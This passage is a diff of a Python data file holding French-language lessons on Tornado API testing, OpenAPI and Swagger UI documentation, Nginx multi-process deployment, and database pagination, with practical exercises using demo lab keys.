+            "Interrogez `GET http://127.0.0.1:8888/api/v1/sandbox/formations` avec `curl -i` pour relever le trio d'en-têtes `Deprecation`, `Sunset` et `Link`, puis comparez l'arbre JSON retourné par `/api/v2/sandbox/formations`.",
+            "Exécutez `day_5/03_architecture_blueprints.py` et ajoutez un gestionnaire `GoneV0Handler` monté sur `r\"/api/v0/.*\"` qui renvoie `410 Gone` accompagné d'un en-tête `Link` pointant vers `/api/v2/formations`."
         ]
     },
 
@@ -944,55 +1495,90 @@ ENRICHMENT_D4_D5 = {
     # =========================================================================
     "d5-l3": {
         "context": (
-            "Comment une équipe d'ingénieurs peut-elle déployer une mise à jour de son API Tornado le jeudi après-midi "
-            "avec la certitude absolue qu'elle n'a cassé aucune des 120 routes existantes ?\n"
-            "Tester manuellement chaque route avec `curl` ou Postman après chaque modification de code devient "
-            "humainement impossible dès la deuxième semaine d'un projet. Par ailleurs, comment exploiter tous les cœurs CPU "
-            "d'un serveur Linux de production avec Tornado derrière un répartiteur de charge Nginx ?\n"
-            "Ce chapitre réunit les trois piliers de l'industrialisation : **Tests automatisés (`tornado.testing.AsyncHTTPTestCase`)**, "
-            "**Spécification OpenAPI 3.0** et **Architecture de déploiement multi-instances (`Nginx + Tornado HTTPServer(xheaders=True)`)**."
+            "Livrer en production une plateforme Tornado critique exige de franchir le fossé qui sépare un script "
+            "fonctionnant sur le poste d'un développeur d'un système distribué auditable, vérifiable automatiquement "
+            "et capable de saturer l'ensemble des cœurs matériels d'un serveur Linux multiprocesseur.\n\n"
+            "Trois disciplines d'ingénierie industrielle convergent à ce stade : le harnais de **tests d'intégration "
+            "asynchrones (`tornado.testing.AsyncHTTPTestCase`)** qui valide en quelques centaines de millisecondes "
+            "les chemins nominaux comme les contrats d'erreur sur une boucle événementielle dédiée ; la publication "
+            "d'un **schéma formel OpenAPI 3.0** ; et la topologie de **déploiement multi-processus derrière Nginx "
+            "(`HTTPServer(app, xheaders=True)`)** permettant de contourner le verrou global de l'interpréteur Python "
+            "(*GIL — Global Interpreter Lock*)."
         ),
         "deep_sections": [
             {
-                "heading": "1. Tests d'intégration automatisés ultra-rapides avec `tornado.testing.AsyncHTTPTestCase`",
+                "heading": "1. Harnais de test isolé avec `tornado.testing.AsyncHTTPTestCase` et `@gen_test`",
                 "body": (
-                    "Tornado intègre nativement un framework de test asynchrone complet dans **`tornado.testing.AsyncHTTPTestCase`** :\n"
-                    "- **Cycle automatisé** : Il suffit de définir `def get_app(self): return create_app()`. Pour chaque test, Tornado démarre "
-                    "une `IOLoop` isolée sur un port éphémère libre et fournit la méthode **`self.fetch(\"/api/v1/formations\", method=..., body=..., headers=...)`**.\n"
-                    "- **Les 3 assertions indispensables d'un test d'API Tornado** :\n"
-                    "  1. Vérifier le **code de statut HTTP** : `self.assertEqual(resp.code, 201)`.\n"
-                    "  2. Vérifier les **en-têtes HTTP** : `self.assertIn(\"application/json\", resp.headers[\"Content-Type\"])`.\n"
-                    "  3. Vérifier la **structure et les valeurs du corps JSON** : `data = tornado.escape.json_decode(resp.body); self.assertEqual(data[\"id\"], 2)`.\n"
-                    "- **Règle d'or de qualité logicielle** : Pour chaque `RequestHandler`, écrivez au minimum un test du **cas nominal (*Happy Path*)** "
-                    "et des tests pour les **cas d'erreur (*Unhappy Paths* : `400`, `401`, `403`, `404`, `422`)**."
+                    "Vérifier manuellement cent routes avec `curl` est incompatible avec l'intégration continue moderne. "
+                    "Tornado intègre dans sa bibliothèque standard la classe **`tornado.testing.AsyncHTTPTestCase`** "
+                    "(héritant de `unittest.TestCase`), qui orchestre pour chaque méthode `test_*` un cycle d'isolation "
+                    "hermétique : instanciation d'une nouvelle `asyncio` / `IOLoop` vierge, ouverture d'un `HTTPServer` "
+                    "lié à un port TCP éphémère alloué par le noyau (`127.0.0.1:0` évitant toute collision de port en CI "
+                    "parallèle), exécution de requêtes HTTP réelles de bout en bout via `self.fetch(\"/api/...\")`, puis "
+                    "fermeture propre de toutes les sockets dans `tearDown()`.\n\n"
+                    "```python — Suite d'intégration complète avec AsyncHTTPTestCase\n"
+                    "import tornado.escape, tornado.testing\n\n"
+                    "class CatalogueAPITest(tornado.testing.AsyncHTTPTestCase):\n"
+                    "    def get_app(self):\n"
+                    "        return create_app({\"testing\": True, \"jwt_secret\": \"cle-test-ci-32-octets-minimum!!\"})\n\n"
+                    "    def test_creation_formation_et_rejet_422(self):\n"
+                    "        rep_invalide = self.fetch(\n"
+                    "            \"/api/v1/formations\", method=\"POST\", body=b'{\"duree\": -3}',\n"
+                    "            headers={\"Content-Type\": \"application/json\"}\n"
+                    "        )\n"
+                    "        self.assertEqual(rep_invalide.code, 422)\n"
+                    "        self.assertIn(\"application/problem+json\", rep_invalide.headers[\"Content-Type\"])\n"
+                    "```\n\n"
+                    "> [!TIP] Symétrie des assertions : cas nominaux et matrice des Unhappy Paths\n"
+                    "> Une suite professionnelle ne se limite jamais au code `200 OK` : pour chaque `RequestHandler`, "
+                    "exigez la vérification du **statut HTTP**, du **`Content-Type`** et du **corps désérialisé** sur "
+                    "l'ensemble des cas de rejet (`400` JSON tronqué, `401` sans jeton, `403` BOLA, `404` et `422`)."
                 )
             },
             {
-                "heading": "2. Le contrat universel `OpenAPI 3.0` (anciennement Swagger) sur `/api/openapi.json`",
+                "heading": "2. Contrat formel `OpenAPI 3.0` exposé sur `/api/openapi.json` comme source unique de vérité",
                 "body": (
-                    "Une API sans documentation à jour est une API inutilisable. Le standard mondial pour décrire formellement "
-                    "une API REST est la **spécification OpenAPI 3.0 (OAS)** :\n"
-                    "- Il s'agit d'un document structuré (en JSON ou YAML), exposé par un `OpenAPIHandler` sur `GET /api/openapi.json`, qui décrit "
-                    "de manière lisible à la fois par l'humain et par la machine :\n"
-                    "  - Les métadonnées de l'API (`info.title`, `info.version`).\n"
-                    "  - La liste exhaustive des chemins (`paths`) et méthodes HTTP (`get`, `post`, `delete`).\n"
-                    "  - Les paramètres attendus (`parameters`), les schémas des corps JSON (`requestBody`) et des réponses (`responses`).\n"
-                    "  - Les schémas de sécurité (`components.securitySchemes`, ex: `bearerAuth`)."
+                    "Dans une architecture découplée, le code Python de vos `RequestHandlers` demeure invisible pour les "
+                    "équipes iOS, Android ou partenaires externes. Publier sur un endpoint dédié (`GET /api/openapi.json`) "
+                    "un document conforme à la norme **OpenAPI Specification 3.0 (OAS)** transforme la documentation "
+                    "en artefact exécutable : ce graphe JSON déclare de manière déterministe les serveurs cibles, les "
+                    "chemins paramétrés, les schémas de validation JSON Schema des charges utiles, les réponses RFC 7807 "
+                    "et les mécanismes d'authentification (`securitySchemes`), permettant aussi bien la génération "
+                    "automatique de SDK clients typés que la validation contractuelle en pipeline CI/CD."
                 )
             },
             {
-                "heading": "3. Déploiement Production : L'architecture `Nginx -> 4 Instances Tornado HTTPServer(xheaders=True)`",
+                "heading": "3. Topologie Linux de production : contourner le GIL CPython par `Nginx -> N x Tornado HTTPServer(xheaders=True)`",
                 "body": (
-                    "Bien qu'un seul processus Tornado puisse gérer des milliers de connexions simultanées grâce à son `IOLoop` non bloquant, "
-                    "un processus Python unique n'utilise qu'**un seul cœur CPU** (à cause du *GIL — Global Interpreter Lock*).\n"
-                    "En production sur Linux (VM, Docker ou Cloud), une API Tornado se déploie selon l'architecture officielle recommandée par Tornado :\n"
-                    "1. **Étage 1 — Le Proxy Inverse & Load Balancer (`Nginx`)** : Placé en première ligne sur les ports `80` et `443`, il gère "
-                    "le chiffrement **HTTPS/TLS**, sert directement les fichiers `/static/` depuis le disque (`sendfile on`), et répartit les requêtes "
-                    "API en *Round-Robin* ou *Least Connections* vers le bloc `upstream isgp_tornado_cluster`.\n"
-                    "2. **Étage 2 — Le Cluster Multi-Processus Tornado (`127.0.0.1:8001` à `8004`)** : On lance 1 processus Tornado par cœur CPU "
-                    "(ex: 4 instances sur les ports `8001` à `8004`) avec **`tornado.httpserver.HTTPServer(app, xheaders=True)`**.\n"
-                    "3. **Rôle vital de `xheaders=True`** : Indique à `HTTPServer` de faire confiance aux en-têtes `X-Forwarded-For`, `X-Real-IP` "
-                    "et `X-Forwarded-Proto` injectés par Nginx afin que `self.request.remote_ip` contienne la vraie IP du client !"
+                    "Bien qu'un unique processus Tornado maintienne sans effort dix mille connexions `epoll` concurrentes "
+                    "en attente d'entrées-sorties, l'interpréteur standard CPython impose un verrou d'exclusion mutuelle "
+                    "sur l'exécution du bytecode Python : le **GIL (*Global Interpreter Lock*)**. Un processus Tornado "
+                    "unique ne peut donc saturer **qu'un seul cœur physique CPU** lors du parsing JSON ou du chiffrement "
+                    "HMAC. Sur un serveur Linux doté de 4 ou 8 cœurs vCPU, la topologie officielle de production déploie "
+                    "**une flotte de `N` processus Tornado indépendants** (un par cœur CPU, écoutant en boucle locale "
+                    "`127.0.0.1:8001` à `800N`, supervisés par `systemd` ou Kubernetes) en aval d'un proxy inverse **Nginx**.\n\n"
+                    "```text — Bloc amont Nginx de répartition vers un cluster de 4 processus Tornado\n"
+                    "upstream isgp_tornado_cluster {\n"
+                    "    least_conn;\n"
+                    "    server 127.0.0.1:8001 max_fails=3 fail_timeout=10s;\n"
+                    "    server 127.0.0.1:8002 max_fails=3 fail_timeout=10s;\n"
+                    "    server 127.0.0.1:8003 max_fails=3 fail_timeout=10s;\n"
+                    "    server 127.0.0.1:8004 max_fails=3 fail_timeout=10s;\n"
+                    "    keepalive 64;\n"
+                    "}\n"
+                    "```\n\n"
+                    "#### Rôle de Nginx en frontal et impératif de sécurité `xheaders=True`\n\n"
+                    "Nginx assure en langage C natif la terminaison cryptographique **TLS 1.3**, l'amortissement des "
+                    "clients lents (*Slowloris*), la diffusion directe des actifs statiques par appel noyau zéro-copie "
+                    "(`sendfile on`) et l'injection des en-têtes `X-Real-IP`, `X-Forwarded-For` et `X-Forwarded-Proto`. "
+                    "Côté Python, instancier **`HTTPServer(app, xheaders=True)`** instruit Tornado de substituer ces "
+                    "en-têtes dans `self.request.remote_ip` et `self.request.protocol`.\n\n"
+                    "> [!WARNING] Confinement réseau strict des ports internes Tornado (`127.0.0.1`)\n"
+                    "> N'activez `xheaders=True` que lorsque vos processus Tornado écoutent exclusivement sur l'interface "
+                    "privée `address=\"127.0.0.1\"` (ou un sous-réseau privé filtré n'acceptant que Nginx). Si le port "
+                    "`8001` était directement joignable depuis Internet avec `xheaders=True`, n'importe quel attaquant "
+                    "pourrait forger `X-Forwarded-For: 1.2.3.4` dans `curl` pour usurper son adresse IP et contourner "
+                    "intégralement vos journaux d'audit et votre limiteur de débit !"
                 )
             }
         ],
@@ -1045,8 +1631,8 @@ ENRICHMENT_D4_D5 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez `day_5/04_tests_et_production.py` pour lancer la suite de 6 tests `AsyncHTTPTestCase` et vérifier la restitution d'IP via `xheaders=True`.",
-            "Explorez l'onglet **Cluster Nginx (4x)** dans l'interface du laboratoire pour simuler la répartition de charge entre les 4 nœuds Tornado (`8001` à `8004`)."
+            "Exécutez `day_5/04_tests_et_production.py` pour lancer les six tests `AsyncHTTPTestCase` et observer comment `self.fetch(..., headers={\"X-Forwarded-For\": \"41.107.12.8\"})` valide le comportement exact de `xheaders=True`.",
+            "Ajoutez une procédure d'arrêt gracieux (*Graceful Shutdown*) capturant `SIGTERM` : appelez `server.stop()` pour cesser d'accepter de nouvelles connexions Nginx, laissez `asyncio.sleep(2)` aux coroutines en vol pour achever leurs transactions SQL, puis arrêtez l'`IOLoop`."
         ]
     },
 
@@ -1055,53 +1641,84 @@ ENRICHMENT_D4_D5 = {
     # =========================================================================
     "d5-l4": {
         "context": (
-            "Dans une entreprise où l'équipe Backend Python développe une API Tornado consommée par une équipe Mobile (iOS/Android), "
-            "une équipe Frontend (React/Vue) et des partenaires externes, comment communiquer la liste des URLs, les types "
-            "de chaque champ JSON et les jetons requis ?\n"
-            "Si vous rédigez un document Word ou un fichier PDF, **il devient obsolète dès la semaine suivante** dès qu'un "
-            "développeur ajoute ou modifie un champ dans un `RequestHandler`.\n"
-            "L'industrie mondiale a résolu ce problème grâce au standard **OpenAPI 3.0 (anciennement Swagger)** couplé au "
-            "portail Web interactif **Swagger UI (`/api/docs`)** : un contrat unique, lisible à la fois par les machines "
-            "et par les humains, permettant de tester chaque route en direct depuis le navigateur."
+            "Lorsque l'équipe Backend Python développe une API Tornado consommée simultanément par des équipes "
+            "Mobiles (Swift/Kotlin), un portail Frontend (React/TypeScript) et des intégrateurs externes, la "
+            "synchronisation documentaire devient rapidement le premier goulot d'étranglement organisationnel. Tout "
+            "document statique rédigé sous Word, Confluence ou PDF diverge inévitablement du code réel dès la "
+            "première semaine d'itération agile.\n\n"
+            "L'industrie logicielle a éliminé cette dérive grâce à l'adoption universelle de la norme **OpenAPI "
+            "Specification 3.0 (OAS)** couplée au portail d'exploration interactif **Swagger UI (`/api/docs`)**. "
+            "Servi directement par deux `RequestHandlers` légers au sein même de votre application Tornado, ce "
+            "contrat déclaratif unifie la lecture humaine, l'exécution de requêtes réelles authentifiées depuis le "
+            "navigateur et la génération automatisée de code client."
         ),
         "deep_sections": [
             {
-                "heading": "1. Histoire et distinction exacte : `OpenAPI Specification (OAS)` vs `Swagger`",
+                "heading": "1. Généalogie et distinction rigoureuse : norme `OpenAPI Specification (OAS)` contre outillage `Swagger`",
                 "body": (
-                    "En entretien comme en réunion d'architecture, il est essentiel de connaître la distinction exacte entre ces deux termes :\n"
-                    "- **2010–2015 (*Swagger 1.0 et 2.0*)** : Créé initialement par Tony Tam chez Wordnik puis racheté par SmartBear.\n"
-                    "- **Novembre 2015 (Création de l'*OpenAPI Initiative*)** : SmartBear fait don de la spécification à la **Linux Foundation** "
-                    "(avec Google, Microsoft, IBM, Stripe). La norme s'appelle désormais officiellement **OpenAPI Specification (OAS 3.0 / 3.1)**.\n"
-                    "- **Aujourd'hui** :\n"
-                    "  - **`OpenAPI 3.0`** désigne la **règle / la grammaire standard** du fichier de contrat (`openapi.json` ou `openapi.yaml`).\n"
-                    "  - **`Swagger`** désigne la **boîte à outils** qui manipule ce fichier :\n"
-                    "    1. **`Swagger UI`** : L'application Web HTML/JS qui lit `/api/openapi.json` et génère le portail interactif avec les boutons *« Try it out »* et *« Authorize »*.\n"
-                    "    2. **`Swagger Editor`** : L'éditeur avec validation syntaxique en temps réel.\n"
-                    "    3. **`Swagger Codegen` / `OpenAPI Generator`** : L'outil qui génère automatiquement le code client (Python, TypeScript, Kotlin, Swift) ou une collection Postman à partir de `openapi.json`."
+                    "Dans les revues d'architecture comme en entretien d'ingénierie senior, employer indifféremment les "
+                    "termes *OpenAPI* et *Swagger* trahit une approximation historique qu'il convient de dissiper.\n\n"
+                    "#### De Swagger 2.0 à la gouvernance ouverte de la Linux Foundation (OAS 3.0 / 3.1)\n\n"
+                    "Conçu en 2010 par Tony Tam puis acquis par SmartBear Software, le format s'appelait initialement "
+                    "*Swagger Specification* (versions 1.2 puis 2.0). En novembre 2015, SmartBear a transféré la "
+                    "propriété intellectuelle du standard à l'**OpenAPI Initiative**, consortium neutre hébergé par la "
+                    "Linux Foundation réunissant Google, Microsoft, IBM et Stripe. Depuis la version 3.0, une séparation "
+                    "stricte prévaut : **`OpenAPI` (`3.0.3` / `3.1.0`)** désigne exclusivement la **grammaire normative "
+                    "ouverte** du fichier de contrat (`openapi.json` ou `openapi.yaml`), tandis que **`Swagger`** "
+                    "désigne la **famille d'outils logiciels** exploitant cette grammaire — notamment **`Swagger UI`** "
+                    "(le portail Web interactif), **`Swagger Editor`** (l'éditeur validant) et **`OpenAPI Generator`** "
+                    "(le compilateur générant automatiquement les SDK clients et collections Postman)."
                 )
             },
             {
-                "heading": "2. Anatomie chirurgicale d'un contrat OpenAPI 3.0 (`paths`, `$ref`, `securitySchemes`)",
+                "heading": "2. Anatomie structurelle d'un graphe OpenAPI 3.0.3 : `paths` RFC 6570, pointeurs `$ref` et `securitySchemes`",
                 "body": (
-                    "Un document OpenAPI 3.0 (`openapi: \"3.0.3\"`) s'articule autour de cinq sections maîtresses :\n"
-                    "1. **`info` & `servers`** : Identifient le titre de l'API, sa version sémantique (`1.0.0`) et les URLs des environnements (`http://127.0.0.1:8888`).\n"
-                    "2. **`paths` (Les routes avec syntaxe `{variable}`)** : Contrairement à Tornado qui utilise des regex `([0-9]+)` et Postman qui utilise `:id`, "
-                    "**OpenAPI impose les accolades `{id}`** (`/api/v1/formations/{id}`). Chaque chemin détaille les méthodes (`get`, `post`, `put`, `delete`), "
-                    "les `parameters` (`in: \"path\"`, `in: \"query\"`, `in: \"header\"`), le `requestBody` et toutes les `responses` (`200`, `201`, `401`, `403`, `422`).\n"
-                    "3. **`components.schemas` et les pointeurs `$ref`** : On définit une seule fois la structure d'une `Formation` ou d'une `ErreurRFC7807` "
-                    "dans `components.schemas` et on la pointe partout avec `{\"$ref\": \"#/components/schemas/Formation\"}`.\n"
-                    "4. **`components.securitySchemes` (Le bouton cadenas *Authorize*)** : C'est cette section qui active le bouton **« Authorize »** en haut à droite "
-                    "de Swagger UI pour permettre de saisir un **`Bearer Token` JWT** (`type: \"http\", scheme: \"bearer\"`) ou une **`X-API-Key`** (`type: \"apiKey\", in: \"header\"`)."
+                    "Un document conforme à `openapi: \"3.0.3\"` modélise l'intégralité de la surface réseau d'une API "
+                    "Tornado sous la forme d'un arbre déclaratif régi par JSON Schema.\n\n"
+                    "#### Discordance syntaxique entre expressions régulières Tornado et gabarits d'URI OpenAPI (`{id}`)\n\n"
+                    "Un point d'attention crucial concerne la notation des segments variables d'URL : alors que le "
+                    "routeur interne de Tornado compile des groupes de capture PCRE tels que `r\"/api/v1/formations/([0-9]+)\"`, "
+                    "la norme OpenAPI impose strictement les **gabarits d'URI RFC 6570 entre accolades** "
+                    "(`\"/api/v1/formations/{id}\"`), reliés à une entrée `{\"name\": \"id\", \"in\": \"path\", "
+                    "\"required\": true, \"schema\": {\"type\": \"integer\"}}`. Inscrire une regex Python brute dans "
+                    "`paths` briserait le formulaire de saisie interactif *Try it out* de Swagger UI.\n\n"
+                    "#### Factorisation DRY par `$ref` et activation du coffre `Authorize` (`securitySchemes`)\n\n"
+                    "Plutôt que de dupliquer trente fois la définition des champs d'une ressource `Formation` ou d'une "
+                    "enveloppe d'erreur `ProblemDetails` RFC 7807, on les centralise dans `components.schemas` et on les "
+                    "référence par pointeur JSON `{\"$ref\": \"#/components/schemas/Formation\"}`. Parallèlement, la "
+                    "section `components.securitySchemes` déclare vos protocoles d'authentification (`http` `bearer` JWT "
+                    "ou `apiKey` dans `X-API-Key`), ce qui matérialise automatiquement le bouton cadenas **« Authorize »** "
+                    "dans Swagger UI et injecte l'en-tête cryptographique sur tous les essais interactifs.\n\n"
+                    "```json — Extrait canonique components.securitySchemes dans openapi.json\n"
+                    "{\n"
+                    "  \"components\": {\n"
+                    "    \"securitySchemes\": {\n"
+                    "      \"BearerAuth\": {\"type\": \"http\", \"scheme\": \"bearer\", \"bearerFormat\": \"JWT\"},\n"
+                    "      \"ApiKeyAuth\": {\"type\": \"apiKey\", \"in\": \"header\", \"name\": \"X-API-Key\"}\n"
+                    "    }\n"
+                    "  }\n"
+                    "}\n"
+                    "```"
                 )
             },
             {
-                "heading": "3. Comment intégrer Swagger UI dans Tornado : `OpenAPISpecHandler` + `SwaggerUIHandler`",
+                "heading": "3. Intégration zéro-dépendance dans Tornado : le tandem `OpenAPISpecHandler` et `SwaggerUIHandler`",
                 "body": (
-                    "Dans l'écosystème Tornado, deux approches complémentaires sont utilisées :\n"
-                    "1. **Approche Native Explicite (`/api/openapi.json` + `SwaggerUIHandler`)** : Comme démontré dans `day_5/05_swagger_openapi_ui.py` et sur "
-                    "notre propre serveur (`/api/docs`), il suffit d'un `OpenAPISpecHandler` appelant `self.write(SPEC)` et d'un `SwaggerUIHandler` de 20 lignes "
-                    "chargeant `SwaggerUIBundle`. **Avantage** : zéro dépendance externe complexe, maîtrise totale du contrat.\n"
-                    "2. **Extensions (`apispec` + `tornado-swagger`) ou approche *Contract-First*** : Génèrent ou valident `openapi.yaml` dans le pipeline CI/CD."
+                    "Contrairement aux frameworks lourds nécessitant des plugins opaques souvent incompatibles avec les "
+                    "mises à jour majeures de Python, la philosophie minimaliste et explicite de Tornado permet "
+                    "d'embarquer un portail OpenAPI de grade industriel en moins de trente lignes de Python standard.\n\n"
+                    "#### Architecture à deux endpoints découplés (`/api/openapi.json` et `/api/docs`)\n\n"
+                    "Le premier gestionnaire, `OpenAPISpecHandler`, expose le dictionnaire Python (ou le fichier YAML "
+                    "validé au démarrage) sur `GET /api/openapi.json` via `self.write(SPEC)`. Le second, `SwaggerUIHandler`, "
+                    "sert sur `GET /api/docs` une page HTML5 épurée instanciant `SwaggerUIBundle({url: '/api/openapi.json'})`. "
+                    "Cette approche *Contract-First* garantit un contrôle chirurgical sur chaque exemple, chaque code "
+                    "d'erreur et chaque en-tête documenté, sans aucune surcharge d'introspection au fil de l'`IOLoop`.\n\n"
+                    "> [!IMPORTANT] Gouvernance d'exposition de `/api/docs` en environnement de production\n"
+                    "> Sur une API publique destinée à des développeurs tiers, exposer `/api/docs` publiquement est un "
+                    "atout majeur d'adoption. En revanche, sur une API interne d'administration critique, l'exposition "
+                    "anonyme de `/api/openapi.json` livre sur un plateau la cartographie complète de vos endpoints et "
+                    "paramètres à un attaquant en phase de reconnaissance : restreignez alors `/api/docs` et "
+                    "`/api/openapi.json` au réseau privé VPN ou protégez-les derrière un contrôle d'accès dans Nginx."
                 )
             }
         ],
@@ -1147,8 +1764,8 @@ ENRICHMENT_D4_D5 = {
             }
         ],
         "practical_exercises": [
-            "Ouvrez le portail Swagger UI intégré à ce laboratoire (`/api/docs`), cliquez sur le bouton cadenas **« Authorize »**, entrez la clé `isgp-secret-2026` dans `ApiKeyAuth`, puis testez la route `GET /api/sandbox/admin-stats` avec **« Try it out »**.",
-            "Dans `day_5/05_swagger_openapi_ui.py`, ajoutez la documentation de la méthode `DELETE /api/v1/formations/{id}` sous la clé `paths[\"/api/v1/formations/{id}\"]` avec les réponses `200` et `404`."
+            "Ouvrez le portail Swagger UI du laboratoire (`/api/docs`), déverrouillez le coffre **« Authorize »** avec la clé `isgp-secret-2026` dans `ApiKeyAuth`, puis exécutez `GET /api/sandbox/admin-stats` via **« Try it out »** en observant la commande `curl` générée.",
+            "Enrichissez `day_5/05_swagger_openapi_ui.py` en documentant l'opération `DELETE /api/v1/formations/{id}` assortie de la sécurité `BearerAuth` et des réponses référencées `204`, `401`, `403` et `404`."
         ]
     },
 
@@ -1157,49 +1774,99 @@ ENRICHMENT_D4_D5 = {
     # =========================================================================
     "d5-l5": {
         "context": (
-            "Dans un prototype pédagogique, `SELECT * FROM formations` renvoie 5 lignes en 1 milliseconde. "
-            "Mais après deux ans en production, votre table `factures`, `journaux_audit` ou `inscriptions` contient "
-            "**2 millions d'enregistrements**. Si un client appelle `GET /api/v1/inscriptions` et que Tornado tente de "
-            "charger et sérialiser les 2 millions de lignes d'un coup, la mémoire vive (RAM) explose, l'`IOLoop` gèle "
-            "et le serveur s'effondre pour tous les utilisateurs.\n"
-            "Ce chapitre de clôture 100 % Tornado vous donne les armes d'ingénierie de données utilisées sur les APIs à fort trafic : "
-            "la **Pagination par `Offset/Limit`**, la **Pagination par Curseur (`Keyset Pagination`) en temps constant $O(1)$**, "
-            "le **Filtrage multi-critères** et le **Tri dynamique protégé par liste blanche (`Whitelist`)**."
+            "Sur une base d'essai contenant dix enregistrements, l'instruction naïve `SELECT * FROM inscriptions` "
+            "s'exécute en moins d'une milliseconde. Deux ans après la mise en production, lorsque la même table "
+            "totalise **cinq millions de lignes**, cette même requête déclenche une catastrophe en chaîne : le moteur "
+            "SQL sature ses entrées-sorties disque, Python alloue plusieurs gigaoctets de dictionnaires en RAM et la "
+            "sérialisation JSON monolithique fige l'`IOLoop` Tornado pendant plusieurs secondes, provoquant l'expiration "
+            "en cascade de toutes les autres connexions actives.\n\n"
+            "Ce chapitre de synthèse clôt le Volume III en réunissant les quatre techniques d'ingénierie de données "
+            "indispensables aux collections à fort volume : la pagination classique bornée **`Offset / Limit`**, la "
+            "pagination haute performance par **Curseur (`Keyset / Seek Pagination`) en temps constant `O(1)`** sur "
+            "arbre B-Tree, le filtrage déclaratif multi-critères et le **tri dynamique blindé par liste blanche** "
+            "contre toute injection SQL."
         ),
         "deep_sections": [
             {
-                "heading": "1. Pagination par `Offset / Limit` (`?page=2&per_page=20`) : Fonctionnement et Limite SQL",
+                "heading": "1. Pagination `Offset / Limit` (`?page=2&per_page=20`) : plafonnement défensif et dérive `O(N)`",
                 "body": (
-                    "La pagination classique par numéro de page repose sur deux paramètres d'URL (`page` et `per_page`) :\n"
-                    "- **Calcul de l'Offset** : `offset = (page - 1) * per_page`. Pour la page 3 avec 20 éléments par page, on saute les `40` premiers "
-                    "éléments (`SELECT * FROM formations ORDER BY id ASC LIMIT 20 OFFSET 40`).\n"
-                    "- **Plafonnement défensif obligatoire** : Ne laissez jamais un client demander `?per_page=1000000` ! Imposez toujours un plafond "
-                    "côté serveur : `per_page = min(50, max(1, int(self.get_query_argument(\"per_page\", \"20\"))))`.\n"
-                    "- **Pourquoi `OFFSET` ralentit sur les très grandes tables** : Lorsque la base SQL exécute `LIMIT 20 OFFSET 500000`, le moteur "
-                    "doit quand même lire, trier et traverser les **500 000 premières lignes** sur le disque avant de les jeter pour ne garder que les 20 suivantes."
+                    "L'approche la plus familière pour découper une collection destinée à une grille d'administration "
+                    "numérotée traduit le couple `(page, per_page)` en décalage arithmétique `offset = (page - 1) * per_page` "
+                    "transmis à `LIMIT ? OFFSET ?`. Deux garde-fous logiciels sont ici impératifs : borner strictement "
+                    "la taille de tranche demandée (`per_page = min(50, max(1, per_page_brut))`) afin qu'aucun client ne "
+                    "puisse réclamer `?per_page=5000000`, et déporter l'exécution SQL sur un `ThreadPoolExecutor` via "
+                    "`run_in_executor` (ou un pilote asynchrone natif `asyncpg`) pour préserver la fluidité de l'`IOLoop`.\n\n"
+                    "#### Pourquoi `OFFSET` dégrade dramatiquement les performances à grande profondeur\n\n"
+                    "Sur le plan physique du moteur relationnel (PostgreSQL, MySQL ou SQLite), une clause `OFFSET 500000 "
+                    "LIMIT 20` n'effectue **aucun saut magique** : le planificateur SQL doit parcourir, matérialiser, "
+                    "vérifier la visibilité transactionnelle MVCC et compter séquentiellement les **500 000 premières "
+                    "lignes** uniquement pour les jeter avant de retourner les 20 suivantes ! Outre ce coût linéaire "
+                    "`O(N)`, toute insertion concurrente en tête de table pendant qu'un utilisateur navigue de la page 1 "
+                    "à la page 2 décale l'ensemble des indices d'un cran, faisant apparaître un doublon sur la page suivante.\n\n"
+                    "> « OFFSET tells the database to skip the first N rows—yet the database still has to fetch and count "
+                    "those N rows from disk or index before discarding them. » — Markus Winand, *SQL Performance Explained*"
                 )
             },
             {
-                "heading": "2. Pagination Haute Performance par `Curseur / Keyset` (`?after_id=1042&limit=20`)",
+                "heading": "2. Pagination par Curseur (`Keyset / Seek Pagination`) : traversée d'index B-Tree en temps `O(1)`",
                 "body": (
-                    "Pour éliminer la lenteur d'`OFFSET` sur les flux infinis ou les tables de plusieurs millions de lignes, les grandes APIs "
-                    "industrielles utilisent la **Pagination par Curseur (*Cursor / Keyset Pagination*)** :\n"
-                    "- Au lieu de demander « la page 25 000 », le client indique l'identifiant (ou le timestamp) du **dernier élément qu'il a reçu** : "
-                    "`GET /api/v1/catalogue/cursor?after_id=1042&limit=20`.\n"
-                    "- **Requête SQL en temps constant $O(1)$** : `SELECT * FROM formations WHERE id > ? ORDER BY id ASC LIMIT ?` avec `(after_id, limit)`.\n"
-                    "- Comme la colonne `id` possède un index B-Tree (clé primaire), SQLite/PostgreSQL saute **instantanément** à l'enregistrement `1043` "
-                    "en moins d'une milliseconde, qu'il s'agisse du début ou de la fin d'une table de 50 millions de lignes !"
+                    "Pour les flux continus mobiles, les historiques financiers et les synchronisations massives de "
+                    "données, les architectures à très fort trafic (Stripe, GitHub, Slack) abandonnent `OFFSET` au "
+                    "profit de la **Pagination par Curseur (*Keyset / Seek Method*)**. Au lieu d'un numéro de page "
+                    "abstrait, le client transmet la clé d'ancrage du dernier enregistrement reçu : "
+                    "`GET /api/v1/catalogue/cursor?after_id=1042&limit=20`.\n\n"
+                    "```sql — Saut direct logarithmique/constant dans l'arbre B-Tree de la clé primaire\n"
+                    "SELECT id, titre, domaine, duree_jours, tarif_dzd\n"
+                    "FROM formations\n"
+                    "WHERE id > ?\n"
+                    "ORDER BY id ASC\n"
+                    "LIMIT ?;\n"
+                    "```\n\n"
+                    "#### Astuce industrielle `LIMIT + 1` pour calculer `has_more` sans requête `COUNT(*)`\n\n"
+                    "Grâce au prédicat `WHERE id > ? ORDER BY id ASC`, le moteur SQL descend directement les trois ou "
+                    "quatre niveaux de l'index **B-Tree** de la clé primaire jusqu'au nœud `1043` et lit uniquement "
+                    "20 feuilles contiguës : le temps de réponse demeure inférieur à la milliseconde (`O(log N)` de "
+                    "descente B-Tree, soit pratiquement **`O(1)` constant** en latence), que vous lisiez le début ou le "
+                    "cinquante-millionième élément ! De plus, en demandant `limit + 1` lignes à SQLite/PostgreSQL puis "
+                    "en ne renvoyant que `lignes[:limit]`, vous déterminez instantanément s'il reste une page suivante "
+                    "(`has_more = len(lignes) > limit`) sans jamais payer le coût prohibitif d'un `SELECT COUNT(*)` global."
                 )
             },
             {
-                "heading": "3. Filtrage Multi-Critères et Tri Dynamique Sécurisé par Liste Blanche (`CHAMPS_TRI_AUTORISES`)",
+                "heading": "3. Filtrage dynamique composé et tri sécurisé par liste blanche (`CHAMPS_TRI_AUTORISES`)",
                 "body": (
